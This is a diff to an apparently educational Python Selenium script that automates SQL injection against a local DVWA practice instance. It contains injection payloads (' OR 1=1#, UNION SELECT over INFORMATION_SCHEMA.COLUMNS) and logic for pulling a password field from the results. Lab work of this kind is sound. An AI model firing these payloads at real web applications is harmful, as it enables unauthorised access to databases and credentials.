@@ -4,17 +4,15 @@ from fileParser import *
 
 
 class Injection:
-    def __init__(self, num_params, table_name, prevention_type, injection_dict, driver):
+    def __init__(self, num_params, table_name, prevention_type, injection_list, driver):
         self.columns = []
-        # Count number of successful injections, the first injection is always successful as "1" is a valid user ID
-        self.successful_injection = 0
-        # Assume that we know the return output will consist of 2 values (firstname and surname)
-        self.max_columns = num_params
+        self.successful_injection = 0  # Count number of successful injections, the first injection is always successful as "1" is a valid user ID
+        self.max_columns = num_params  # Assume that we know the return output will consist of 2 values (firstname and surname)
         self.table = table_name
         self.current_injection = 0
         self.prevention_type = prevention_type
-        self.injection_dict = injection_dict
-        self.max_injections = len(self.injection_dict)
+        self.injection_list = injection_list
+        self.max_injections = len(self.injection_list)
         self.injections = []
         self.final_param = ""
         self.driver = driver
@@ -73,7 +71,7 @@ class Injection:
     def get_injection_string(self):
         string_concat = ""
 
-        raw_injection_string = self.injection_dict[self.current_injection]
+        raw_injection_string = self.injection_list[self.current_injection]
         if isinstance(raw_injection_string, list):
             for elem in raw_injection_string:
                 if elem == "guess_param":
@@ -96,7 +94,7 @@ class Injection:
             self.driver.back()
         if self.is_not_error(output):
             if self.prevention_type == 0:
-                if self.current_injection == len(self.injection_dict) - 1:
+                if self.current_injection == len(self.injection_list) - 1:
                     password_name_tag = output[len(output)-1].split("<br>")[-1]
                     self.final_param = password_name_tag.split(":")[-1].strip()
             if self.inject_success(output):
@@ -138,16 +136,17 @@ def test_injections(output_dict):
 
 
 def set_injections():
-    return ["' OR 1=1#", "1 OR 1=1", ["1' OR 1=1 UNION SELECT ", "params", " FROM INFORMATION_SCHEMA.COLUMNS=",
-                                      "table_name", " WHERE COLUMN_NAME LIKE '", "guess_param", "'#"],
-            ["1' OR 1=1 UNION SELECT ", "param_guess", " FROM ", "table_name", "#"]]
+    injection = ["' OR 1=1#", "1 OR 1=1", ["1' OR 1=1 UNION SELECT ", "params", " FROM INFORMATION_SCHEMA.COLUMNS=",
+                                           "table_name", " WHERE COLUMN_NAME LIKE '", "guess_param", "'#"],
+                 ["1' OR 1=1 UNION SELECT ", "param_guess", " FROM ", "table_name", "#"]]
+    return injection
 
 
 def printer(injection):
     print('=' * 100)
     print('Finished injecting')
     print()
-    print('Out of total ' + str(len(injection.injection_dict)) + ' potential injections, ' +
+    print('Out of total ' + str(len(injection.injection_list)) + ' potential injections, ' +
           str(injection.successful_injection) + ' were successful.')
     print()
     if injection.successful_injection > 0:
@@ -165,8 +164,8 @@ def main():
     driver = webdriver.Chrome()
     driver.get("http://localhost/dvwa/vulnerabilities/sqli/")
     parser = Parser(input("file path: "))
-    injection_dict = set_injections()
-    injection = Injection(parser.num_params_output, parser.table_name, parser.prevention_type, injection_dict, driver)
+    injections = set_injections()
+    injection = Injection(parser.num_params_output, parser.table_name, parser.prevention_type, injections, driver)
     printer(injection)
     driver.close()
 
